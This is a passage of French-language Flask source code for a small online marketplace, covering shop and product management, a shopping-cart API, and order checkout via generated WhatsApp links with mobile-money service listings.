    {"nom": "Sports & Loisirs", "icone": "⚽", "description": "Équipements sportifs, loisirs, plein air"},
    {"nom": "Livres & Médias", "icone": "📚", "description": "Livres, musique, films, jeux vidéo"},
    {"nom": "Alimentation", "icone": "🍔", "description": "Produits alimentaires, boissons, épicerie"},
    {"nom": "Bébé & Enfant", "icone": "👶", "description": "Articles pour bébés et enfants"},
    {"nom": "Animaux", "icone": "🐕", "description": "Accessoires et produits pour animaux"},
    {"nom": "Auto & Moto", "icone": "🚗", "description": "Pièces détachées, accessoires automobiles"},
    {"nom": "Art & Artisanat", "icone": "🎨", "description": "Œuvres d'art, faits main, artisanat"},
    {"nom": "Autre", "icone": "📦", "description": "Autres catégories non listées"},
]


def init_categories():
    """Initialise les catégories par défaut si elles n'existent pas"""
    for cat in CATEGORIES_PREDEFINIES:
        if not Categorie.query.filter_by(nom=cat["nom"]).first():
            nouvelle_cat = Categorie(
                nom=cat["nom"],
                description=cat["description"],
                icone=cat["icone"]
            )
            db.session.add(nouvelle_cat)
    try:
        db.session.commit()
    except:
        db.session.rollback()


@app.route("/api/categories")
def api_categories():
    """Retourne la liste des catégories en JSON"""
    categories = Categorie.query.order_by(Categorie.nom).all()
    return jsonify([{
        "id": c.id,
        "nom": c.nom,
        "description": c.description,
        "icone": c.icone
    } for c in categories])


@app.route("/boutique/creer", methods=["GET", "POST"])
@login_required
def creer_boutique():
    """Page pour créer une nouvelle boutique"""
    user = get_logged_in_user()

    # Vérifier si l'utilisateur a déjà une boutique
    existing_boutique = Boutique.query.filter_by(user_id=user.id, est_actif=True).first()
    if existing_boutique:
        flash("Vous avez déjà une boutique active.", "warning")
        return redirect(url_for("ma_boutique", boutique_id=existing_boutique.id))

    if request.method == "POST":
        nom = request.form.get("nom", "").strip()
        description = request.form.get("description", "").strip()
        email = request.form.get("email", "").strip()
        whatsapp = request.form.get("whatsapp", "").strip()
        adresse = request.form.get("adresse", "").strip()
        ville = request.form.get("ville", "").strip()
        pays = request.form.get("pays", "").strip()
        latitude = request.form.get("latitude", "").strip()
        longitude = request.form.get("longitude", "").strip()

        if not nom:
            flash("Le nom de la boutique est obligatoire.", "danger")
            return render_template("boutique_creer.html", user=user)

        nouvelle_boutique = Boutique(
            user_id=user.id,
            nom=nom,
            description=description,
            email=email,
            whatsapp=whatsapp,
            adresse=adresse,
            ville=ville,
            pays=pays,
            latitude=latitude,
            longitude=longitude
        )

        db.session.add(nouvelle_boutique)
        db.session.commit()

        flash("Boutique créée avec succès ! 🎉", "success")
        return redirect(url_for("ma_boutique", boutique_id=nouvelle_boutique.id))

    return render_template("boutique_creer.html", user=user)


@app.route("/boutique/<int:boutique_id>")
def ma_boutique(boutique_id):
    """Page principale d'une boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    produits = Produit.query.filter_by(boutique_id=boutique_id, est_actif=True).order_by(Produit.date_creation.desc()).all()

    # Calculer la note moyenne
    avis = AvisBoutique.query.filter_by(boutique_id=boutique_id).all()
    note_moyenne = sum(a.note for a in avis) / len(avis) if avis else 0

    # Compter les commandes en attente et les ventes confirmées
    commandes_en_attente = Commande.query.filter_by(boutique_id=boutique_id, statut='en_attente').count()
    ventes_confirmees = Commande.query.filter_by(boutique_id=boutique_id, statut='confirmee').count()

    return render_template("boutique_view.html",
        boutique=boutique,
        produits=produits,
        note_moyenne=note_moyenne,
        nb_avis=len(avis),
        user=user,
        nb_commandes_en_attente=commandes_en_attente,
        nb_ventes=ventes_confirmees
    )


@app.route("/boutique/<int:boutique_id>/configurer", methods=["GET", "POST"])
@login_required
def configurer_boutique(boutique_id):
    """Page pour configurer sa boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    if request.method == "POST":
        boutique.nom = request.form.get("nom", "").strip()
        boutique.description = request.form.get("description", "").strip()
        boutique.email = request.form.get("email", "").strip()
        boutique.whatsapp = request.form.get("whatsapp", "").strip()
        boutique.adresse = request.form.get("adresse", "").strip()
        boutique.ville = request.form.get("ville", "").strip()
        boutique.pays = request.form.get("pays", "").strip()
        boutique.latitude = request.form.get("latitude", "").strip()
        boutique.longitude = request.form.get("longitude", "").strip()

        # Gestion du logo
        if "logo" in request.files:
            file = request.files["logo"]
            if file and allowed_file(file.filename):
                filename = secure_filename(f"logo_{boutique.id}_{file.filename}")
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                # Convertir le chemin absolu en chemin relatif pour le web
                boutique.logo = filepath.replace(os.path.join(app.root_path, 'static'), '/static').replace('\\', '/')

        # Gestion de la bannière
        if "banniere" in request.files:
            file = request.files["banniere"]
            if file and allowed_file(file.filename):
                filename = secure_filename(f"banniere_{boutique.id}_{file.filename}")
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                # Convertir le chemin absolu en chemin relatif pour le web
                boutique.banniere = filepath.replace(os.path.join(app.root_path, 'static'), '/static').replace('\\', '/')

        db.session.commit()
        flash("Boutique mise à jour avec succès !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("boutique_config.html", boutique=boutique, user=user)


# ============================================
# CONFIGURATION UPLOAD D'IMAGES PRODUITS
# ============================================
UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads', 'products')
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'webp'}
MAX_CONTENT_LENGTH = 5 * 1024 * 1024  # 5MB max

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

def allowed_file(filename):
    """Vérifie si l'extension du fichier est autorisée"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def save_product_image(file):
    """
    Sauvegarde une image de produit et retourne le chemin relatif
    Retourne None si le fichier n'est pas valide
    """
    if not file or not file.filename:
        return None
    
    if not allowed_file(file.filename):
        return None
    
    # Générer un nom de fichier unique
    import uuid
    ext = file.filename.rsplit('.', 1)[1].lower()
    unique_filename = f"{uuid.uuid4().hex}.{ext}"
    
    # Créer le dossier s'il n'existe pas
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    
    # Sauvegarder le fichier
    filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
    file.save(filepath)
    
    # Retourner le chemin relatif pour la base de données
    return f"uploads/products/{unique_filename}"

@app.route("/boutique/<int:boutique_id>/produit/ajouter", methods=["GET", "POST"])
@login_required
def ajouter_produit(boutique_id):
    """Page pour ajouter un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    categories = Categorie.query.order_by(Categorie.nom).all()

    if request.method == "POST":
        nom = request.form.get("nom", "").strip()
        description = request.form.get("description", "").strip()
        prix = request.form.get("prix", type=float)
        prix_promo = request.form.get("prix_promo", type=float)
        quantite = request.form.get("quantite", type=int, default=1)
        categorie_id = request.form.get("categorie_id", type=int)
        couleurs = request.form.get("couleurs", "").strip()
        tailles = request.form.get("tailles", "").strip()

        if not nom or not prix:
            flash("Le nom et le prix sont obligatoires.", "danger")
            return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)

        # Gérer l'upload d'image
        image_path = None
        if 'image' in request.files:
            file = request.files['image']
            if file and file.filename != '':
                image_path = save_product_image(file)
                if image_path is None:
                    flash("Type de fichier non autorisé. Utilisez JPG, PNG ou WebP.", "danger")
                    return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)

        nouveau_produit = Produit(
            boutique_id=boutique.id,
            nom=nom,
            description=description,
            prix=prix,
            prix_promo=prix_promo if prix_promo and prix_promo < prix else None,
            quantite=quantite,
            categorie_id=categorie_id if categorie_id else None,
            couleurs_disponibles=couleurs,
            tailles_disponibles=tailles,
            est_en_promo=prix_promo is not None and prix_promo < prix,
            images=image_path if image_path else None
        )

        # Générer un slug unique pour le produit
        nouveau_produit.slug = nouveau_produit.generate_slug()

        db.session.add(nouveau_produit)
        db.session.commit()

        flash("Produit ajouté avec succès !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)


@app.route("/boutique/<int:boutique_id>/produit/<int:produit_id>/modifier", methods=["GET", "POST"])
@login_required
def modifier_produit(boutique_id, produit_id):
    """Page pour modifier un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    categories = Categorie.query.order_by(Categorie.nom).all()

    if request.method == "POST":
        ancien_nom = produit.nom
        ancienne_images = produit.images  # Sauvegarder l'ancien chemin
        
        produit.nom = request.form.get("nom", "").strip()
        produit.description = request.form.get("description", "").strip()
        produit.prix = request.form.get("prix", type=float)
        produit.prix_promo = request.form.get("prix_promo", type=float)
        produit.quantite = request.form.get("quantite", type=int, default=1)
        produit.categorie_id = request.form.get("categorie_id", type=int)
        produit.couleurs_disponibles = request.form.get("couleurs", "").strip()
        produit.tailles_disponibles = request.form.get("tailles", "").strip()
        produit.est_en_promo = produit.prix_promo is not None and produit.prix_promo < produit.prix

        # Gérer l'upload d'une nouvelle image
        if 'image' in request.files:
            file = request.files['image']
            if file and file.filename != '':
                image_path = save_product_image(file)
                if image_path is None:
                    flash("Type de fichier non autorisé. Utilisez JPG, PNG ou WebP.", "danger")
                    return render_template("produit_modifier.html", boutique=boutique, produit=produit, categories=categories, user=user)
                
                # Supprimer l'ancienne image du disque si elle existe
                if ancienne_images:
                    try:
                        old_path = os.path.join(app.root_path, 'static', ancienne_images)
                        if os.path.exists(old_path):
                            os.remove(old_path)
                    except Exception as e:
                        print(f"Erreur suppression ancienne image: {e}")
                
                produit.images = image_path

        # Régénérer le slug si le nom a changé
        if produit.nom != ancien_nom:
            produit.slug = produit.generate_slug()

        db.session.commit()
        flash("Produit mis à jour avec succès !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("produit_modifier.html", boutique=boutique, produit=produit, categories=categories, user=user)


@app.route("/boutique/<int:boutique_id>/produit/<int:produit_id>/supprimer")
@login_required
def supprimer_produit(boutique_id, produit_id):
    """Supprimer un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    db.session.delete(produit)
    db.session.commit()

    flash("Produit supprimé avec succès.", "success")
    return redirect(url_for("ma_boutique", boutique_id=boutique.id))


@app.route("/produits")
def liste_produits():
    """Page publique pour voir tous les produits"""
    user = get_logged_in_user()
    categorie_id = request.args.get("categorie", type=int)
    recherche = request.args.get("q", "").strip()

    query = Produit.query.filter_by(est_actif=True)

    if categorie_id:
        query = query.filter_by(categorie_id=categorie_id)

    if recherche:
        query = query.filter(
            db.or_(
                Produit.nom.ilike(f"%{recherche}%"),
                Produit.description.ilike(f"%{recherche}%")
            )
        )

    produits = query.order_by(Produit.date_creation.desc()).limit(50).all()
    categories = Categorie.query.order_by(Categorie.nom).all()

    # Retourne la page products.html existante avec les produits
    return render_template("products.html",
        produits=produits,
        categories=categories,
        categorie_actuelle=categorie_id,
        recherche=recherche,
        user=user
    )


@app.route("/produit/<int:produit_id>")
def voir_produit(produit_id):
    """Page détail d'un produit (vue vendeur/admin)"""
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # Incrémenter le compteur de vues
    produit.vues = (produit.vues or 0) + 1
    db.session.commit()

    return render_template("produit_detail.html", produit=produit, user=user)


# ──────────────────────────────────────────────────────
# 🛍️ ROUTES PUBLIQUES POUR LES CLIENTS
# ──────────────────────────────────────────────────────

@app.route("/product/<slug>")
def voir_produit_public(slug):
    """Page produit publique pour les clients (URL avec slug)"""
    produit = Produit.query.filter_by(slug=slug, est_actif=True).first_or_404()
    
    # Incrémenter le compteur de vues
    produit.vues = (produit.vues or 0) + 1
    db.session.commit()
    
    # Vérifier si l'utilisateur connecté est le propriétaire
    user = get_logged_in_user()
    is_owner = user and produit.boutique.user_id == user.id
    
    # Produits similaires (même catégorie ou boutique)
    produits_similaires = []
    if produit.categorie_id:
        produits_similaires = Produit.query.filter(
            Produit.categorie_id == produit.categorie_id,
            Produit.id != produit.id,
            Produit.est_actif == True
        ).order_by(Produit.date_creation.desc()).limit(4).all()
    else:
        produits_similaires = Produit.query.filter(
            Produit.boutique_id != produit.boutique_id,
            Produit.est_actif == True
        ).order_by(Produit.date_creation.desc()).limit(4).all()
    
    return render_template("product_public.html", 
        produit=produit, 
        user=user,
        is_owner=is_owner,
        produits_similaires=produits_similaires
    )


@app.route("/shop/<username>")
def boutique_publique(username):
    """Page boutique publique pour les clients"""
    # Trouver l'utilisateur par son username
    vendeur = User.query.filter_by(username=username).first_or_404()

    # Trouver la boutique active du vendeur
    boutique = Boutique.query.filter_by(user_id=vendeur.id, est_actif=True).first()
    if not boutique:
        flash("Cette boutique n'existe pas ou n'est plus active.", "danger")
        return redirect(url_for("index_page"))

    # Récupérer tous les produits actifs de la boutique
    produits = Produit.query.filter_by(boutique_id=boutique.id, est_actif=True).order_by(Produit.date_creation.desc()).all()

    # Récupérer les avis de la boutique
    avis = AvisBoutique.query.filter_by(boutique_id=boutique.id).order_by(AvisBoutique.date_creation.desc()).all()
    
    # Calculer la note moyenne
    note_moyenne = sum(a.note for a in avis) / len(avis) if avis else 0

    user = get_logged_in_user()

    return render_template("shop_public.html",
        boutique=boutique,
        vendeur=vendeur,
        produits=produits,
        avis=avis,
        note_moyenne=note_moyenne,
        nb_avis=len(avis),
        user=user
    )


@app.route("/shop/<username>/avis", methods=["POST"])
@login_required
def ajouter_avis_boutique(username):
    """Ajouter un avis/commentaire sur une boutique"""
    vendeur = User.query.filter_by(username=username).first_or_404()
    boutique = Boutique.query.filter_by(user_id=vendeur.id, est_actif=True).first()
    
    if not boutique:
        flash("Boutique introuvable.", "danger")
        return redirect(url_for("index_page"))
    
    user = get_logged_in_user()
    
    # Vérifier que l'utilisateur n'est pas le propriétaire
    if user.id == vendeur.id:
        flash("Vous ne pouvez pas laisser un avis sur votre propre boutique.", "warning")
        return redirect(url_for("boutique_publique", username=username))
    
    # Vérifier si l'utilisateur a déjà laissé un avis
    existing_avis = AvisBoutique.query.filter_by(boutique_id=boutique.id, user_id=user.id).first()
    if existing_avis:
        flash("Vous avez déjà laissé un avis sur cette boutique.", "warning")
        return redirect(url_for("boutique_publique", username=username))
    
    note = request.form.get("note", type=int)
    commentaire = request.form.get("commentaire", "").strip()
    
    if not note or note < 1 or note > 5:
        flash("La note doit être entre 1 et 5.", "danger")
        return redirect(url_for("boutique_publique", username=username))
    
    if not commentaire:
        flash("Le commentaire est obligatoire.", "danger")
        return redirect(url_for("boutique_publique", username=username))
    
    nouvel_avis = AvisBoutique(
        boutique_id=boutique.id,
        user_id=user.id,
        note=note,
        commentaire=commentaire
    )
    
    db.session.add(nouvel_avis)
    db.session.commit()
    
    flash("Votre avis a été publié avec succès ! 🎉", "success")
    return redirect(url_for("boutique_publique", username=username))


# ==============================
# 🛒 API PANIER COMPLÈTE
# ==============================

def get_or_create_panier():
    """
    Récupère ou crée un panier pour l'utilisateur courant.
    - Si connecté : panier lié au user_id
    - Si non connecté : panier lié au session_id
    Retourne le panier et un booléen indiquant si c'est un utilisateur connecté.
    """
    user = get_logged_in_user()
    session_id = session.get('panier_session_id')
    
    if user:
        # Utilisateur connecté : on cherche son panier
        panier = Panier.query.filter_by(user_id=user.id).first()
        if not panier:
            panier = Panier(user_id=user.id)
            db.session.add(panier)
            db.session.commit()
        # Si un panier session existait, on le fusionne
        if session_id:
            fusionner_panier_session(session_id, panier)
            session.pop('panier_session_id', None)
        return panier, True
    else:
        # Utilisateur non connecté : on utilise session_id
        if not session_id:
            session_id = str(uuid.uuid4())
            session['panier_session_id'] = session_id
        panier = Panier.query.filter_by(session_id=session_id).first()
        if not panier:
            panier = Panier(session_id=session_id)
            db.session.add(panier)
            db.session.commit()
        return panier, False


def fusionner_panier_session(session_id, panier_user):
    """
    Fusionne le panier d'une session dans le panier d'un utilisateur connecté.
    """
    panier_session = Panier.query.filter_by(session_id=session_id).first()
    if not panier_session:
        return
    
    for article_session in panier_session.articles:
        # Chercher si l'article existe déjà dans le panier utilisateur
        article_user = ArticlePanier.query.filter_by(
            panier_id=panier_user.id,
            produit_id=article_session.produit_id
        ).first()
        
        if article_user:
            # Ajouter la quantité
            article_user.quantite += article_session.quantite
        else:
            # Créer un nouvel article
            nouvel_article = ArticlePanier(
                panier_id=panier_user.id,
                produit_id=article_session.produit_id,
                quantite=article_session.quantite
            )
            db.session.add(nouvel_article)
    
    # Supprimer le panier session
    db.session.delete(panier_session)
    db.session.commit()


@app.route("/api/panier", methods=["GET"])
def api_get_panier():
    """Récupérer le contenu du panier"""
    panier, is_authenticated = get_or_create_panier()
    
    articles = []
    for article in panier.articles:
        produit = article.produit
        prix_actuel = produit.prix_promo if (produit.prix_promo and produit.prix_promo < produit.prix) else produit.prix
        articles.append({
            'id': article.id,
            'produit_id': produit.id,
            'nom': produit.nom,
            'prix': prix_actuel,
            'prix_original': produit.prix,
            'quantite': article.quantite,
            'image': produit.image_principale,
            'sous_total': prix_actuel * article.quantite
        })
    
    total = panier.get_total()
    item_count = panier.get_item_count()
    
    return jsonify({
        'success': True,
        'articles': articles,
        'total': total,
        'item_count': item_count
    })


@app.route("/api/panier/ajouter", methods=["POST"])
def api_ajouter_panier():
    """Ajouter un produit au panier"""
    data = request.get_json()
    produit_id = data.get("produit_id")
    quantite = data.get("quantite", 1)
    
    if not produit_id or quantite < 1:
        return jsonify({"success": False, "message": "Données invalides"}), 400
    
    produit = Produit.query.get(produit_id)
    if not produit or not produit.est_actif:
        return jsonify({"success": False, "message": "Produit non disponible"}), 404
    
    # Vérifier le stock
    if produit.quantite and quantite > produit.quantite:
        return jsonify({"success": False, "message": f"Stock insuffisant ({produit.quantite} disponible)"}), 400
    
    panier, _ = get_or_create_panier()
    
    # Chercher si l'article existe déjà
    article = ArticlePanier.query.filter_by(
        panier_id=panier.id,
        produit_id=produit_id
    ).first()
    
    if article:
        nouvelle_quantite = article.quantite + quantite
        if produit.quantite and nouvelle_quantite > produit.quantite:
            return jsonify({"success": False, "message": f"Stock insuffisant ({produit.quantite} disponible)"}), 400
        article.quantite = nouvelle_quantite
    else:
        article = ArticlePanier(
            panier_id=panier.id,
            produit_id=produit_id,
            quantite=quantite
        )
        db.session.add(article)
    
    # Incrémenter le compteur d'ajouts au panier
    produit.ajouts_panier = (produit.ajouts_panier or 0) + 1
    
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Produit ajouté au panier",
        "item_count": panier.get_item_count()
    })


@app.route("/api/panier/<int:article_id>", methods=["PUT"])
def api_modifier_article_panier(article_id):
    """Modifier la quantité d'un article dans le panier"""
    data = request.get_json()
    nouvelle_quantite = data.get("quantite", 1)
    
    article = ArticlePanier.query.get_or_404(article_id)
    panier, is_authenticated = get_or_create_panier()
    
    # Vérifier que l'article appartient au panier courant
    if article.panier_id != panier.id:
        return jsonify({"success": False, "message": "Article non trouvé dans le panier"}), 404
    
    if nouvelle_quantite < 1:
        # Supprimer l'article
        db.session.delete(article)
        db.session.commit()
        return jsonify({
            "success": True,
            "message": "Article supprimé du panier",
            "item_count": panier.get_item_count()
        })
    
    # Vérifier le stock
    if article.produit.quantite and nouvelle_quantite > article.produit.quantite:
        return jsonify({"success": False, "message": f"Stock insuffisant ({article.produit.quantite} disponible)"}), 400
    
    article.quantite = nouvelle_quantite
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Quantité mise à jour",
        "item_count": panier.get_item_count()
    })


@app.route("/api/panier/<int:article_id>", methods=["DELETE"])
def api_supprimer_article_panier(article_id):
    """Supprimer un article du panier"""
    article = ArticlePanier.query.get_or_404(article_id)
    panier, _ = get_or_create_panier()
    
    # Vérifier que l'article appartient au panier courant
    if article.panier_id != panier.id:
        return jsonify({"success": False, "message": "Article non trouvé dans le panier"}), 404
    
    db.session.delete(article)
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Article supprimé du panier",
        "item_count": panier.get_item_count()
    })


@app.route("/api/panier/clear", methods=["POST"])
def api_clear_panier():
    """Vider complètement le panier"""
    panier, _ = get_or_create_panier()
    
    # Supprimer tous les articles
    ArticlePanier.query.filter_by(panier_id=panier.id).delete()
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Panier vidé"
    })


@app.route("/api/panier/count", methods=["GET"])
def api_panier_count():
    """Récupérer le nombre d'articles dans le panier (pour le badge)"""
    panier, _ = get_or_create_panier()
    return jsonify({
        "count": panier.get_item_count()
    })


@app.route("/api/panier/checkout-whatsapp", methods=["POST"])
def api_checkout_whatsapp():
    """Créer une commande et générer un lien WhatsApp pour contacter le vendeur"""
    data = request.get_json()
    
    if not data:
        return jsonify({"success": False, "message": "Données invalides"}), 400
    
    articles = data.get("articles", [])
    total = data.get("total", 0)
    nom = data.get("nom", "").strip()
    telephone = data.get("telephone", "").strip()
    adresse = data.get("adresse", "").strip()
    ville = data.get("ville", "").strip()
    
    # Validation
    if not articles or not nom or not telephone or not adresse or not ville:
        return jsonify({"success": False, "message": "Tous les champs sont obligatoires"}), 400
    
    # Nettoyer le numéro de téléphone
    telephone = telephone.replace(" ", "").replace("-", "").replace(".", "")
    
    # Calculer les frais de livraison
    frais_livraison = 0 if total > 50000 else 2000
    grand_total = total + frais_livraison
    
    # Récupérer le panier et le premier article pour trouver le vendeur
    panier, _ = get_or_create_panier()
    premier_article_panier = panier.articles.first()
    
    if not premier_article_panier:
        return jsonify({"success": False, "message": "Panier vide"}), 400
    
    # Trouver la boutique et le vendeur
    produit = premier_article_panier.produit
    boutique = produit.boutique
    vendeur = boutique.proprietaire
    
    # Utiliser d'abord le numéro WhatsApp de la boutique, sinon le phone du vendeur
    whatsapp_number = boutique.whatsapp or vendeur.phone
    
    # Vérifier que le vendeur a un numéro WhatsApp
    vendeur_phone = whatsapp_number.replace("+", "").replace(" ", "").replace("-", "")
    if not vendeur_phone:
        return jsonify({"success": False, "message": "Le vendeur n'a pas configuré son numéro WhatsApp"}), 400
    
    # Ajouter l'indicatif si nécessaire (pour les numéros qui ne commencent pas par un indicatif connu)
    if not vendeur_phone.startswith("225") and not vendeur_phone.startswith("237") and not vendeur_phone.startswith("226") and not vendeur_phone.startswith("229") and not vendeur_phone.startswith("228") and not vendeur_phone.startswith("243") and not vendeur_phone.startswith("242") and not vendeur_phone.startswith("241") and not vendeur_phone.startswith("256"):
        vendeur_phone = "225" + vendeur_phone  # Défaut Côte d'Ivoire
    
    # Créer la commande
    reference = f"CMD-{uuid.uuid4().hex[:8].upper()}"
    
    nouvelle_commande = Commande(
        user_id=get_logged_in_user().id if get_logged_in_user() else None,
        boutique_id=boutique.id,
        reference=reference,
        statut="en_attente",
        total=grand_total,
        frais_livraison=frais_livraison,
        adresse_livraison=f"{adresse}, {ville}",
        telephone_livraison=telephone,
        notes=f"Nom: {nom}"
    )
    
    db.session.add(nouvelle_commande)
    db.session.flush()
    
    # Ajouter les articles à la commande
    for article_data in articles:
        produit = Produit.query.get(article_data.get("produit_id"))
        if produit:
            article_commande = ArticleCommande(
                commande_id=nouvelle_commande.id,
                produit_id=produit.id,
                quantite=article_data.get("quantite", 1),
                prix_unitaire=article_data.get("prix", produit.prix)
            )
            db.session.add(article_commande)
    
    db.session.commit()
    
    # Générer le message WhatsApp
    articles_text = ""
    for article_data in articles:
        articles_text += f"• {article_data.get('nom', 'Produit')} x{article_data.get('quantite', 1)} - {int(article_data.get('prix', 0) * article_data.get('quantite', 1))} XOF\n"
    
    message = f"""🛒 *NOUVELLE COMMANDE* - #{reference}

📦 *ARTICLES :*
{articles_text}
💰 *TOTAL :* {int(grand_total)} XOF

📍 *LIVRAISON :*
Nom: {nom}
Tél: {telephone}
Adresse: {adresse}, {ville}

Merci de confirmer cette commande."""
    
    # Encoder le message pour l'URL
    from urllib.parse import quote
    message_encoded = quote(message)
    
    # Vider le panier
    ArticlePanier.query.filter_by(panier_id=panier.id).delete()
    db.session.commit()
    
    # Générer le lien WhatsApp
    whatsapp_url = f"https://wa.me/{vendeur_phone}?text={message_encoded}"
    
    return jsonify({
        "success": True,
        "whatsapp_url": whatsapp_url,
        "reference": reference
    })


@app.route("/cart")
def cart_page():
    """Page panier"""
    user = get_logged_in_user()
    return render_template("cart.html", user=user)


# ==============================
# 💳 SYSTEME DE PAIEMENT COMPLET
# ==============================

@app.route("/checkout", methods=["GET", "POST"])
def checkout_page():
    """Page de paiement avec formulaire"""
    user = get_logged_in_user()
    panier, _ = get_or_create_panier()
    
    if panier.articles.count() == 0:
        flash("Votre panier est vide.", "warning")
        return redirect(url_for("cart_page"))
    
    # Calculer le total
    total = panier.get_total()
    frais_livraison = 0 if total > 50000 else 2000
    grand_total = total + frais_livraison
    
    if request.method == "POST":
        # Récupérer les données du formulaire
        nom_complet = request.form.get("nom_complet", "").strip()
        email = request.form.get("email", "").strip()
        telephone = request.form.get("telephone", "").strip()
        indicatif = request.form.get("indicatif", "+225").strip()
        adresse = request.form.get("adresse", "").strip()
        ville = request.form.get("ville", "").strip()
        
        # Validation
        if not all([nom_complet, email, telephone, adresse, ville]):
            flash("Tous les champs sont obligatoires.", "danger")
            return render_template("checkout.html", 
                user=user, 
                panier=panier, 
                total=total, 
                frais_livraison=frais_livraison,
                grand_total=grand_total)
        
        # Nettoyer le numéro
        telephone = telephone.replace(" ", "").replace("-", "").replace(".", "")
        numero_complet = indicatif + telephone
        
        # Créer la commande
        reference = f"CMD-{uuid.uuid4().hex[:8].upper()}"
        
        # Déterminer la boutique (prendre la première pour simplifier)
        premier_article = panier.articles.first()
        if not premier_article:
            flash("Panier vide.", "danger")
            return redirect(url_for("cart_page"))
        
        boutique = premier_article.produit.boutique
        vendeur = boutique.proprietaire
        
        # Sauvegarder la commande en statut "en_attente"
        nouvelle_commande = Commande(
            user_id=user.id if user else None,
            boutique_id=boutique.id,
            reference=reference,
            statut="en_attente",
            total=grand_total,
            frais_livraison=frais_livraison,
            adresse_livraison=f"{adresse}, {ville}",
            telephone_livraison=numero_complet,
            notes=f"Email: {email}, Nom: {nom_complet}"
        )
        
        db.session.add(nouvelle_commande)
        db.session.flush()
        
        # Ajouter les articles à la commande
        for article in panier.articles:
            produit = article.produit
            prix_actuel = produit.prix_promo if (produit.prix_promo and produit.prix_promo < produit.prix) else produit.prix
            article_commande = ArticleCommande(
                commande_id=nouvelle_commande.id,
                produit_id=produit.id,
                quantite=article.quantite,
                prix_unitaire=prix_actuel
            )
            db.session.add(article_commande)
        
        db.session.commit()
        
        # Générer le message WhatsApp pour le vendeur
        articles_text = ""
        for article in panier.articles:
            prix = article.produit.prix_promo if (article.produit.prix_promo and article.produit.prix_promo < article.produit.prix) else article.produit.prix
            articles_text += f"• {article.produit.nom} x{article.quantite} - {int(prix * article.quantite)} XOF\n"
        
        message = f"""🛒 *NOUVELLE COMMANDE* - #{reference}

📦 *ARTICLES :*
{articles_text}
💰 *TOTAL :* {int(grand_total)} XOF

📍 *LIVRAISON :*
Nom: {nom_complet}
Tél: {numero_complet}
Adresse: {adresse}, {ville}
Email: {email}

Merci de confirmer cette commande."""
        
        # Encoder le message pour l'URL
        from urllib.parse import quote
        message_encoded = quote(message)
        
        # Numéro WhatsApp du vendeur (à adapter selon le pays)
        vendeur_phone = vendeur.phone.replace("+", "").replace(" ", "").replace("-", "")
        if not vendeur_phone.startswith("225") and not vendeur_phone.startswith("237"):
            vendeur_phone = "225" + vendeur_phone  # Défaut Côte d'Ivoire
        
        # Vider le panier
        ArticlePanier.query.filter_by(panier_id=panier.id).delete()
        db.session.commit()
        
        # Rediriger vers WhatsApp
        whatsapp_url = f"https://wa.me/{vendeur_phone}?text={message_encoded}"
        flash("Commande créée avec succès ! Vous allez être redirigé vers WhatsApp.", "success")
        return redirect(whatsapp_url)
    
    # Configuration des pays et services de paiement
    countries = {
        "Cameroun": "CM",
        "Cameroon": "CM",
        "Côte d'Ivoire": "CI",
        "Cote d Ivoire": "CI",
        "Ivory Coast": "CI",
        "Burkina Faso": "BF",
        "Bénin": "BJ",
        "Benin": "BJ",
        "Togo": "TG",
        "Congo DRC": "COD",
        "RDC": "COD",
        "République Démocratique du Congo": "COD",
        "Congo": "COG",
        "Congo Brazzaville": "COG",
        "Gabon": "GAB",
        "Uganda": "UGA",
    }
    
    services = {
        "CM": [
            {"id": 1, "name": "MOMO CM", "description": "MTN MOBILE MONEY CAMEROUN"},
            {"id": 2, "name": "OM CM", "description": "ORANGE MONEY CAMEROUN"},
        ],
        "CI": [
            {"id": 29, "name": "OM CI", "description": "ORANGE MONEY COTE D'IVOIRE"},
            {"id": 30, "name": "MOMO CI", "description": "MTN MONEY COTE D'IVOIRE"},
            {"id": 31, "name": "MOOV CI", "description": "MOOV COTE D'IVOIRE"},
            {"id": 32, "name": "WAVE CI", "description": "WAVE COTE D'IVOIRE"},
        ],
        "BF": [
            {"id": 33, "name": "MOOV BF", "description": "MOOV BURKINA FASO"},
            {"id": 34, "name": "OM BF", "description": "ORANGE MONEY BURKINA FASO"},
        ],
        "BJ": [
